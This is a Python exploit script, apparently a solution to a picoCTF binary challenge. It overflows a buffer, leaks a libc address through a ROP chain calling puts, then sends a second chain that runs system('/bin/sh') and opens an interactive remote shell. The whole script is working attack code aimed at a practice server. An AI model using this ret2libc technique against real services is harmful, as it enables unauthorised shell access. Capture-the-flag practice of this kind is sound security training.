from ptrlib import *

# sock = Process('./vuln')
sock = Socket('mercury.picoctf.net', 49464)
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

rop_pop_rdi = 0x0000000000400913 # pop rdi ; ret
rop_pop_rsi_r15 = 0x0000000000400911 # pop rsi ; pop r15 ; ret
rop_ret = 0x000000000040052e # ret

# ## leak libc address
payload = b'A' * 136
payload += flat([
    # p64(addr_reloc),
    p64(rop_pop_rdi),
    p64(elf.got("puts")),
    p64(elf.plt("puts")),
    p64(elf.symbol("main")),
])

sock.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n', payload)
print(sock.recvline()) # recv AaAa...
puts_addr = u64(sock.recvline())
libc.set_base(puts_addr - libc.symbol('puts'))

# log
print("puts: {}".format(hex(puts_addr)))
print("libc base: {}".format(hex(libc.base())))
print("system: {}".format(hex(libc.symbol('system'))))

# ## exec system('/bin/sh\0')
payload = b'A' * 136
payload += flat([
    p64(rop_ret),
    p64(rop_pop_rdi),
    p64(next(libc.find('/bin/sh\0'))),
    p64(libc.symbol('system')),
])
sock.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n', payload)

sock.interactive()
